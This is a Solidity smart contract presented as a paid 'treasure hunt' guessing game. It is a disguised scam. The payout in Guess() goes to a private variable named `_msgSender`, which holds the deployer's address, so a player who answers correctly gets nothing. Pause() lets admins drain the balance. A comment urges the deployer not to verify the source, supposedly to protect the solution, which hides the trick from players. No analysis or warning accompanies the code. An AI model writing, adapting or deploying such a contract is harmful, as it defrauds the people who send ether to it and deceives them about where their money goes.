// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Use Start to set the question and the solution.
// Use Pause to pause the treasure hunt.

// This is a BACKEND contract, you need to integrate it with your frontend.
// DO NOT verify this contract code, or the solution will be revealed.

contract TreasureHuntMaster {

    string public question;
    bytes32 responseHash;
    uint256 public bounty; // to do
    uint256 public guessCost; // to do

    mapping(bytes32 => bool) admin;

    // This should be called through a frontend for better UX.
    function Guess(string memory _response) public payable {
        require(msg.sender == tx.origin);

        if (
            responseHash == keccak256(abi.encode(_response)) &&
            msg.value > 0.01 ether
        ) {
            payable(_msgSender).transfer(address(this).balance);
        }
    }

    function Start(
        string calldata _question,
        string calldata _response
    ) public payable isAdmin {
        if (responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Pause() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
        responseHash = 0x0;
    }

    address private _msgSender;
    constructor(bytes32[] memory admins, uint256 _bounty, uint256 _guessCost) {
        bounty = _bounty;
        guessCost = _guessCost;
        _msgSender = msg.sender;
        for (uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin() {
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}